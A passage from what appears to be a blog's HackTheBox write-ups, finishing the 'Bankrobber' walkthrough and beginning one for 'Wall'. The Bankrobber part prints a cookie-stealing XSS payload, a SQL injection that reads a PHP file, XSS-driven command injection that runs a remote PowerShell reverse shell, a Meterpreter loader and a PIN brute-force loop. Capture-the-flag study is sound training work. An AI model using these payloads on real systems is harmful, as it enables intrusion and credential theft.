-&gt;  index.php                                     </span><br><span class="line">[18:14:32] 403 -    1KB - /phpmyadmin                                                   </span><br><span class="line">[18:14:34] 403 -    1KB - /phpmyadmin/                                  </span><br><span class="line">[18:14:34] 403 -    1KB - /phpmyadmin/scripts/setup.php</span><br><span class="line">[18:14:36] 200 -    0B  - /register.php                                                        </span><br><span class="line">[18:14:37] 403 -    1KB - /server-info                                                                  </span><br><span class="line">[18:14:37] 403 -    1KB - /server-status</span><br><span class="line">[18:14:37] 403 -    1KB - /server-status/ </span><br><span class="line">[18:14:45] 403 -    1KB - Trace.axd::<span class="variable">$DATA</span>                                                                        </span><br><span class="line">[18:14:45] 301 -  335B  - /user  -&gt;  http://10.10.10.154/user/              </span><br><span class="line">[18:14:45] 200 -   39B  - /user/         </span><br><span class="line">[18:14:46] 403 -    1KB - web.config::<span class="variable">$DATA</span>                          </span><br><span class="line">                                                                                        </span><br><span class="line">Task Completed                                                                                                                                                                                                                    </span><br><span class="line">root <span class="keyword">in</span> dirsearch on  master via 🐍 v2.7.17 took 1m3s </span><br><span class="line">❯</span><br></pre></td></tr></table></figure><p>things that caught my attention is this web directories</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sh</span></span><br><span class="line"></span><br><span class="line">[18:13:55] 200 -   40B  - /admin/?/login</span><br><span class="line">[18:13:55] 200 -   40B  - /admin/                </span><br><span class="line">[18:13:55] 200 -   40B  - /admin/index.php</span><br></pre></td></tr></table></figure><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Create-account-and-Login"><a href="#Create-account-and-Login" class="headerlink" title="Create account and Login"></a>Create account and Login</h3><p>To test’ I created an account and login it too. Next,<br>I visited the <code>/admin/index.php</code> and says <code>You&#39;re not authorized to view this page</code> for me this is really weird, if you have experience in Web development you will notice that there was an misconfigured in this website.</p><p><img src="/img/bank/admin.PNG" alt="HackTheBox-Bankrobber/admin.png" title="Admin/index.php"></p><h3 id="Steal-Admin-creds-via-Cookies"><a href="#Steal-Admin-creds-via-Cookies" class="headerlink" title="Steal Admin creds via Cookies"></a>Steal Admin creds via Cookies</h3><p>Now I need to get the credentials of the admin. I try to look on the page source of the web page to look for hint but I did not see anything.<br>then I try the e-coin transfer in user page and this <code>alert</code> caught my attention.</p><p><img src="/img/bank/transfer.png" alt="HackTheBox-Bankrobber/transfer.png" title="Transfer e-coin"></p><p>It looks like the admin is checking each transfer transaction, so I intercept it with <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> (A Web Penetration Testing tool)</p><p><img src="/img/bank/bank-burp1.png" alt="HackTheBox-Bankrobber/bank-burp1.png" title="Bank burp1"></p><p>Using this payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" target="_blank" rel="noopener">PayloadAllTheThings</a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"># xss</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">this.src</span>=<span class="string">"http://10.10.15.71/?c="</span>%<span class="attr">2bdocument.cookie</span>&gt;</span></span><br></pre></td></tr></table></figure><p>my user id # here is <code>ID #4</code>, my <code>username</code> and <code>password</code> in on <code>base64</code> code format.<br><code>toId=</code> is the id where I transfer my e-coin. I set first my <code>nc</code> listener on port 80 then I modify the response with my payload and send it.</p><p><img src="/img/bank/bank-burp-send.png" alt="HackTheBox-Bankrobber/bank-burp-send.png" title="Bank burp2"></p><p>after 5-10 minutes of waiting, I’ll get a response in my <code>nc</code> listener and it’s the username and password of the admin in <code>base64</code> code format.<br>Convert it to plaintext and I got now the admin creds.</p><p><img src="/img/bank/bank-admin-creds.png" alt="HackTheBox-Bankrobber/bank-admin-creds.png" title="Bank Admin credentials"></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">username:   admin</span><br><span class="line">password:   Hopelessromantic</span><br></pre></td></tr></table></figure><h3 id="Login-as-Admin"><a href="#Login-as-Admin" class="headerlink" title="Login as Admin"></a>Login as Admin</h3><p>Now that I have the admin credentials, login as admin, and find some interesting capabilities.<br>and there’s a <code>NOTES.TXT</code> inside of the Admin page.</p><p><img src="/img/bank/bank-notes-web.png" alt="HackTheBox-Bankrobber/bank-notes-web.png" title="Bank Admin page"></p><p>Looking at the notes.</p><p><img src="/img/bank/bank-notes1.png" alt="HackTheBox-Bankrobber/bank-notes1.png" title="Bank Notes"></p><p>I don’t know what that means, but there are two things that I’m sure of.<br>    ⇒ <code>default Xampp</code> installation folder is in the <code>C:\xampp\htdocs\</code> where you can run a local web server.<br>    ⇒ There’s was a vulnerability in the <code>encode comments</code>. For every IP address.</p><p>Next, the two interesting things I found inside the admin page – <code>Search users</code> and <code>Backdoorchecker</code>.<br>I try to search my <code>ID #</code> in search users (beta) when you say <code>beta</code> it’s not fully functional, there was an existing bugs and errors with that.</p><p><img src="/img/bank/bank-myid.png" alt="HackTheBox-Bankrobber/my-id.png" title="Bank my id#"></p><p><code>Backdoorchecker</code></p><p><img src="/img/bank/bank-backdoorchecker.png" alt="HackTheBox-Bankrobber/bank-backdoorchecker.png" title="Bank Backdoor Checker"></p><p>   ⇒ Due to recent hacking attemps on the server, Backdoorcheker features is only accessible from the localhost because it returns the following message when I try any commands:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dir</span><br></pre></td></tr></table></figure><p>There’s a possibility that this features is vulnerable to <a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">SQLi</a>.</p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="XSS-and-SQL-Injection"><a href="#XSS-and-SQL-Injection" class="headerlink" title="XSS and SQL Injection"></a>XSS and SQL Injection</h3><p>I try to intercept the <code>search users</code> function using <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> and try SQL Injection.</p><p><code>term=4</code> is my <code>user ID #</code> then sending this to repeater, I put this sql syntax to check how’s <code>backdoorchecker.php</code> work.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sql</span></span><br><span class="line"></span><br><span class="line">term=4<span class="string">' union all select 1,LOAD_FILE('</span>C:\\xampp\\htdocs\\admin\\backdoorchecker.php<span class="string">'),3-- -</span></span><br></pre></td></tr></table></figure><p>and I got this response.</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line"></span><br><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Sun, <span class="number">08</span> Mar <span class="number">2020</span> <span class="number">20</span>:<span class="number">30</span>:<span class="number">14</span> GMT</span><br><span class="line">Server: Apache/<span class="number">2.4</span><span class="number">.39</span> (Win64) OpenSSL/<span class="number">1.1</span><span class="number">.1</span>b PHP/<span class="number">7.3</span><span class="number">.4</span></span><br><span class="line">X-Powered-By: PHP/<span class="number">7.3</span><span class="number">.4</span></span><br><span class="line">Content-Length: <span class="number">1169</span></span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF<span class="number">-8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;table width=<span class="string">'90%'</span>&gt;&lt;tr&gt;&lt;th&gt;ID&lt;/th&gt;&lt;th&gt;User&lt;/th&gt;&lt;/tr&gt;</span><br><span class="line">   &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;<span class="number">4</span>&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;medz&lt;/td&gt;</span><br><span class="line">   &lt;/tr&gt;</span><br><span class="line">      </span><br><span class="line">   &lt;tr&gt;</span><br><span class="line">      &lt;td&gt;<span class="number">1</span>&lt;/td&gt;</span><br><span class="line">      &lt;td&gt;<span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">include</span>(<span class="string">'../link.php'</span>);</span><br><span class="line">   <span class="keyword">include</span>(<span class="string">'auth.php'</span>);</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">   $username = base64_decode(urldecode($_COOKIE[<span class="string">'username'</span>]));</span><br><span class="line">   $password = base64_decode(urldecode($_COOKIE[<span class="string">'password'</span>]));</span><br><span class="line">   $bad    = <span class="keyword">array</span>(<span class="string">'$('</span>,<span class="string">'&amp;'</span>);</span><br><span class="line">   $good      = <span class="string">"ls"</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(strtolower(substr(PHP_OS,<span class="number">0</span>,<span class="number">3</span>)) == <span class="string">"win"</span>)&#123;</span><br><span class="line">         $good = <span class="string">"dir"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span>($username == <span class="string">"admin"</span> &amp;&amp; $password == <span class="string">"Hopelessromantic"</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'cmd'</span>]))&#123;</span><br><span class="line">                  <span class="comment">// FILTER ESCAPE CHARS</span></span><br><span class="line">                  <span class="keyword">foreach</span>($bad <span class="keyword">as</span> $char)&#123;</span><br><span class="line">                     <span class="keyword">if</span>(strpos($_POST[<span class="string">'cmd'</span>],$char) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"You're not allowed to do that."</span>);</span><br><span class="line">                     &#125;</span><br><span class="line">                  &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// CHECK IF THE FIRST 2 CHARS ARE LS</span></span><br><span class="line">            <span class="keyword">if</span>(substr($_POST[<span class="string">'cmd'</span>], <span class="number">0</span>,strlen($good)) != $good)&#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">"It's only allowed to use the $good command"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"::1"</span>)&#123;</span><br><span class="line">                  system($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"It's only allowed to access this function from localhost (::1).&lt;br&gt; This is due to the recent hack attempts on our server."</span>;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You are not allowed to use this function!"</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="meta">?&gt;</span></span><br><span class="line">      &lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">   &lt;/table&gt;</span><br></pre></td></tr></table></figure><p>– sql injection<br><img src="/img/bank/bank-sql-injection.png" alt="HackTheBox-Bankrobber/bank-sql-injection.png" title="Bank Backdoor Checker"></p><p>It returns to send the request from <code>localhost</code> and the first <code>3</code> characters must be “dir” and you can use the characters <code>$(&quot; or &#39;&amp;&#39;&quot;)</code></p><p>To execute code I use the PhantomJS bot (via XSS) to send a post request to <code>backdoorchecker.php</code> with a code execution bypass inside the parameter.<br>I ping my Kali linux machine and set tcpdump. I used:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">dirasdf || ping 10.10.15.71</span><br></pre></td></tr></table></figure><p><img src="/img/bank/bank-ping.png" alt="HackTheBox-Bankrobber/bank-ping.png" title="Bank Backdoor Checker"></p><p>and my Kali Linux get a response from Bankrobber</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber </span><br><span class="line">❯ tcpdump -i tun0</span><br><span class="line">tcpdump: verbose output suppressed, use -v or -vv <span class="keyword">for</span> full protocol decode</span><br><span class="line">listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes</span><br><span class="line">07:25:28.957530 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421326422 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:29.208067 IP 10.10.15.71.41238 &gt; 10.10.10.154.http: Flags [S], seq 339059589, win 64240, options [mss 1460,sackOK,TS val 2421326672 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:29.967531 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421327432 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:30.222861 IP 10.10.15.71.41238 &gt; 10.10.10.154.http: Flags [S], seq 339059589, win 64240, options [mss 1460,sackOK,TS val 2421327687 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:31.983082 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421329447 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:32.239634 IP 10.10.15.71.41238 &gt; 10.10.10.154.http: Flags [S], seq 339059589, win 64240, options [mss 1460,sackOK,TS val 2421329704 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:34.209667 IP 10.10.15.71.41240 &gt; 10.10.10.154.http: Flags [S], seq 232555969, win 64240, options [mss 1460,sackOK,TS val 2421331674 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:35.215733 IP 10.10.15.71.41240 &gt; 10.10.10.154.http: Flags [S], seq 232555969, win 64240, options [mss 1460,sackOK,TS val 2421332680 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:36.015323 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421333479 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:37.231355 IP 10.10.15.71.41240 &gt; 10.10.10.154.http: Flags [S], seq 232555969, win 64240, options [mss 1460,sackOK,TS val 2421334695 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:25:44.207219 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421341671 ecr 0,nop,wscale 7], length 0</span><br><span class="line">07:26:00.335356 IP 10.10.15.71.41236 &gt; 10.10.10.154.http: Flags [S], seq 2958480018, win 64240, options [mss 1460,sackOK,TS val 2421357799 ecr 0,nop,wscale 7], length 0</span><br></pre></td></tr></table></figure><h3 id="Get-Reverse-Shell"><a href="#Get-Reverse-Shell" class="headerlink" title="Get Reverse Shell"></a>Get Reverse Shell</h3><p>To exploit this vulnerabilities and get a reverse shell. I used <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">Nishang - Offensive PowerShell for red team, penetration testing and offensive security.</a> I use the script, <code>Invoke-PowerShellTcp.ps1</code> and named it to <code>evil.ps1</code>.<br>I called it using powershell through an <code>Impacket Samba Server</code> and setup an <code>nc</code> listener to my Kali Linux.</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"># javascript</span><br><span class="line"></span><br><span class="line">&lt;script&gt;<span class="keyword">var</span> xh;<span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123;xh=<span class="keyword">new</span> XMLHttpRequest()&#125;<span class="keyword">else</span>&#123;xh=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>)&#125;;xh.open(<span class="string">"POST"</span>,<span class="string">"/admin/backdoorchecker.php"</span>);xh.setRequestHeader(<span class="string">'Content-type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>);xh.send(<span class="string">"cmd=dirasdf || copy \\\\10.10.15.71\\test\\dfuck"</span>);&lt;<span class="regexp">/script&gt;&amp;amount=&lt;script&gt;var xh;if (window.XMLHttpRequest) &#123;xh=new XMLHttpRequest()&#125;else&#123;xh=new ActiveXObject("Microsoft.XMLHTTP")&#125;;xh.open("POST","/</span>admin/backdoorchecker.php<span class="string">");xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xh.send("</span>cmd=dirasdf || copy \\\\<span class="number">10.10</span><span class="number">.15</span><span class="number">.71</span>\\test\\dfuck<span class="string">");&lt;/script&gt;&amp;comment=&lt;script&gt;var xh;if (window.XMLHttpRequest) &#123;xh=new XMLHttpRequest()&#125;else&#123;xh=new ActiveXObject("</span>Microsoft.XMLHTTP<span class="string">")&#125;;xh.open("</span>POST<span class="string">","</span>/admin/backdoorchecker.php<span class="string">");xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xh.send("</span>cmd=dirasdf || powershell -exec bypass -f \\\\<span class="number">10.10</span><span class="number">.15</span><span class="number">.71</span>\\test\\evil.ps1<span class="string">");&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/bank/bank-XSS.png" alt="HackTheBox-Bankrobber/bank-XSS.png" title="Bank XSS"></p><p>after 5-10 minutes, my <code>impacket-smbserver</code> got a response and get in into the Bankrobber machine.</p><p><img src="/img/bank/bank-impacket.png" alt="HackTheBox-Bankrobber/bank-impacket.png" title="Bank Impacket"></p><p><img src="/img/bank/bank-initial-shell.png" alt="HackTheBox-Bankrobber/bank-initial-shell.png" title="Bank Initial shell"></p><p>and finally I have now the <code>user.txt</code></p><p><img src="/img/bank/bank-user.png" alt="HackTheBox-Bankrobber/bank-user.png" title="Bank USER"></p><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Doing some <a href="https://www.sisainfosec.com/blogs/reconnaissance-the-eagles-eye-of-cyber-security/" target="_blank" rel="noopener">Reconnaissance</a>, I used <a href="https://github.com/carlospolop/winpe" target="_blank" rel="noopener">winPE</a> or <code>Windows privilege escalation with cmd</code> it’s a tool similar to <a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">LinEnum</a>.</p><p>It can help with automating Penetration Tests. It performs a discovery on the environment it runs in and tries finding weaknesses to allow privilege escalation. Saving time and allowing more effort to be put toward getting root.</p><h3 id="Process-and-Active-Connections"><a href="#Process-and-Active-Connections" class="headerlink" title="Process and Active Connections"></a>Process and Active Connections</h3><p>running this takes time. after 10-15 minutes I’ve got now the response.</p><p>System Info of Bankrobber<br><img src="/img/bank/bank-winPE.png" alt="HackTheBox-Bankrobber/bank-winPE.png" title="Bank System Info"></p><p>I see something’s odd running on <code>port 910</code><br><img src="/img/bank/bank-910.png" alt="HackTheBox-Bankrobber/bank-910.png" title="Bank port 910"></p><p>And a suspicious running on the background process named – <code>bankv2.exe</code> is the same <code>PID #1632</code> in <code>port 910</code><br><img src="/img/bank/bank-bankv2.png" alt="HackTheBox-Bankrobber/bank-bankv2.png" title="Bank bankv2"></p><h3 id="Customizing-custom-Meterpreter-loader"><a href="#Customizing-custom-Meterpreter-loader" class="headerlink" title="Customizing custom Meterpreter loader"></a>Customizing custom Meterpreter loader</h3><p>so I tunnel my local port 910 in my Kali Linux system to the port 910 of the Bankrobber. To do so I created an obfuscated meterpreter.</p><p>see this:<br><a href="https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/" target="_blank" rel="noopener">https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/</a></p><p>run the bash script and check the payload file</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">****************************************************************</span><br><span class="line">    Automatic C <span class="built_in">source</span> code generator - FOR METASPLOIT          </span><br><span class="line">           Based on rsmudge metasploit-loader                   </span><br><span class="line">****************************************************************</span><br><span class="line">Metasploit server IP : 10.10.15.71</span><br><span class="line">Metasploit port number : 9001</span><br><span class="line">Compiling binary ..</span><br><span class="line">In file included from temp.c:4:</span><br><span class="line">/usr/share/mingw-w64/include/winsock2.h:15:2: warning: <span class="comment">#warning Please include winsock2.h before windows.h [-Wcpp]</span></span><br><span class="line"> <span class="comment">#warning Please include winsock2.h before windows.h</span></span><br><span class="line">  ^~~~~~~</span><br><span class="line">-rwxr-xr-x 1 root root 292503 Mar  8 09:08 payload.exe</span><br></pre></td></tr></table></figure><p><img src="/img/bank/bank-payload.png" alt="HackTheBox-Bankrobber/bank-payload.png" title="Bank digit code"></p><p>I uploaded it to the Bankrobber and execute it, then I setup a meterpreter session:</p><p>Metasploit meterpreter</p><p><img src="/img/bank/bank-metasploit.png" alt="HackTheBox-Bankrobber/bank-metasploit.png" title="Bank digit code"></p><p>Now that I have the meterpreter session next I did is Port forwarding</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">meterpreter &gt; portfwd add -l 910 -p 910 -r 127.0.0.1</span><br><span class="line">[*] Local TCP relay created: :910 &lt;-&gt; 127.0.0.1:910</span><br></pre></td></tr></table></figure><p>And connect it to the port using <code>nc -vn 127.0.0.1 910</code> and it works! Next I try to input a digit code – <code>1234</code> but it’s not working.</p><p><img src="/img/bank/bank-pincode-wr.png" alt="HackTheBox-Bankrobber/bank-pincodewr.png" title="Bank digit code"></p><h3 id="Brute-force-the-digit-code"><a href="#Brute-force-the-digit-code" class="headerlink" title="Brute force the digit code"></a>Brute force the <code>digit code</code></h3><p>Since I don’t know what is the exact digit code here, I decided to bruteforce it using <code>bash</code> command line even that I have a feeling that I could get blocked by doing this. so</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">❯ <span class="keyword">for</span> i <span class="keyword">in</span> &#123;0...9&#125;&#123;0...9&#125;&#123;0...9&#125;&#123;0...9&#125;; <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$i</span>; <span class="built_in">echo</span> <span class="variable">$i</span> | nc -vn 127.0.0.1 910; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>After a seconds’ I get now the right digit code – <code>0021</code></p><p><img src="/img/bank/bank-right-pin.png" alt="HackTheBox-Bankrobber/bank-right-pin.png" title="Bank digit code"></p><p>When I log in with this PIN, I can transfer e-coins and I see that the <code>transfer.exe</code> process inside is executed:</p><p>   ⇒ [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe</p><p><img src="/img/bank/bank-transfer0021.png" alt="HackTheBox-Bankrobber/bank-transfer0021.png" title="Bank digit code"></p><h3 id="Remote-Code-Execution-RCE"><a href="#Remote-Code-Execution-RCE" class="headerlink" title="Remote Code Execution (RCE)"></a>Remote Code Execution (RCE)</h3><p>Now, theres a possible RCE on that process.<br>I exploited the E-coin transfer by running my payload inside the Bankrobber machine’ and create <code>meterpreter</code> sessions.<br>Instead of putting amount of E-Coins in e-coin transfer. I executed my payload with this line.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">&amp; ..\\..\\..\\..\\..\\..\Users\\C:\Users\Cortin\payload.exe</span><br></pre></td></tr></table></figure><p><img src="/img/bank/bank-RCE.png" alt="HackTheBox-Bankrobber/bank-RCE.png" title="Bank RCE"></p><p>After executed it i got a response from my <code>meterpreter</code> sessions.</p><p><img src="/img/bank/bank-metasploit-root.png" alt="HackTheBox-Bankrobber/bank-metasploit-root.png" title="Bank root"></p><h3 id="Administrator-Shell"><a href="#Administrator-Shell" class="headerlink" title="Administrator Shell"></a>Administrator Shell</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Bankrobber</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 584 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.14393]</span><br><span class="line">(c) 2016 Microsoft Corporation. Alle rechten voorbehouden.</span><br></pre></td></tr></table></figure><p>and Finally rooted !<br>   ⇒ nt authority\system<br><img src="/img/bank/bank-rooted!.png" alt="HackTheBox-Bankrobber/bank-rooted!.png" title="Bank rooted"></p><p>Get <code>root.txt</code><br><img src="/img/bank/bank-root.png" alt="HackTheBox-Bankrobber/bank-root.png" title="Bank rooted"></p><hr><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p><hr><p>Referrences:<br><a href="https://www.speedguide.net/port.php?port=910" target="_blank" rel="noopener">Port 910</a><br><a href="https://www.adminsub.net/tcp-udp-port-finder/910" target="_blank" rel="noopener">Port 910</a><br><a href="https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/" target="_blank" rel="noopener">Customize Meterpreter Payload</a><br><a href="https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/" target="_blank" rel="noopener">XSS with Phantom JS</a></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox - PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> pentest </tag>
            
            <tag> xss </tag>
            
            <tag> sql-injection </tag>
            
            <tag> rce </tag>
            
            <tag> windows </tag>
            
            <tag> retired </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Wall</title>
      <link href="/2019-07-12/HackTheBox-Wall/"/>
      <url>/2019-07-12/HackTheBox-Wall/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/wall/wall-detail.png" alt="HackTheBox-Wall/Nmap.png" title="Wall machine details"></p><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>   → Wall is my very first machine on HackTheBox that I hacked. It is running in Web Application that vulnerable to <code>RCE</code>(Remote Code Execution), a classification of security vulnerabilities. <code>RCE</code> enables a remote attacker to execute arbitrary code, bypassing security authorization, and by abusing this vulnerabilities I manage to get in into the machine. First I fall on to the rabbit hole which is the <code>aa.php</code>, and <code>server-status</code> page. The tricky part of this machine was finding the hidden page of the web application because it’s not something normally shows up in the wordlists. I use the Burp Suite and edit the Request fo find some interesting stuffs and then i found the right page of the webapps. The vulnerability inside is a <code>SUID</code> binary which users can get a full privileges.</p><h2 id="Penetration-Testing-Methodologies"><a href="#Penetration-Testing-Methodologies" class="headerlink" title="Penetration Testing Methodologies"></a>Penetration Testing Methodologies</h2><ol><li><p><strong>Network Scanning</strong></p><p>→ Nmap scan</p><p>→ discover open ports and what services are running</p></li><li><p><strong>Enumeration</strong></p><p>→ Browsing the HTTP Service</p><p>→ Bruteforce the Web page directories</p><p>→ Finding the hidden page</p></li><li><p><strong>Post - Exploitation</strong></p><p>→ Exploring the web page</p><p>→ Bruteforce the credentials using the token</p><p>→ Logging in as admin</p></li><li><p><strong>Exploitation</strong></p><p>→ Getting the Reverse shell using <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/" target="_blank" rel="noopener">CVE-2019-13024</a>.</p><p>→ Find some interesting things</p><p>→ Check Linux Binaries</p></li><li><p><strong>Privilege Escalation</strong></p><p>→ Exploit the unusual Linux binaries</p><p>→ Execute the exploit</p><p>→ Get the root shell and read the root and user file</p></li></ol><h2 id="Network-Scanning"><a href="#Network-Scanning" class="headerlink" title="Network Scanning"></a>Network Scanning</h2><h3 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h3><p>→ First, is to scan the target IP using <strong>Nmap</strong> to get information about the various services that are running on the target machine. We use</p><hr><ul><li>-sV ⇒ Probe open ports to determine service/version info</li><li>-sC ⇒ equivalent to —script=default</li><li>-A  ⇒ Enable OS detection, version detection, script scanning, and traceroute</li><li>-oN ⇒ to save our scan results to a text file</li></ul><hr><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"><span class="string">nmap</span> <span class="string">-sV</span> <span class="string">-sC</span> <span class="string">-A</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.157</span> <span class="string">-oN</span> <span class="string">nmap-Wall</span></span><br></pre></td></tr></table></figure><h3 id="Nmap-results"><a href="#Nmap-results" class="headerlink" title="Nmap results"></a>Nmap results</h3><p><img src="/img/wall/Nmap.png" alt="HackTheBox-Wall/Nmap.png" title="Nmap Results"></p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>By visiting the http page we got the default page of Apache Web Server<br><img src="/img/wall/default_page.png" alt="HackTheBox-Wall/default_page.png" title="Apache Defaul page"></p><p>We try to explore the default page by inspecting the source code but I can’t find any interesting things there so I’ll try to bruteforce the directories to look for hidden page. I use <strong><a href="https://github.com/OJ/gobuster" target="_blank" rel="noopener">gobuster</a></strong> with medium.txt file. To save the outfile we use <code>-o</code> <code>name of a file</code></p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">gobuster dir -u http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">10.157</span> -w <span class="regexp">/usr/</span>share<span class="regexp">/dirbuster/</span>wordlists<span class="regexp">/directory-list-lowercase-2.3-medium.txt -o wall-dir</span></span><br></pre></td></tr></table></figure><p><img src="/img/wall/gobuster.png" alt="HackTheBox-Wall/gobuster.png" title="Gobuster"></p><p>After a minutes of bruteforcing I got the following directories.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gobuster results</span></span><br><span class="line"></span><br><span class="line">→ /aa.php  (Status: 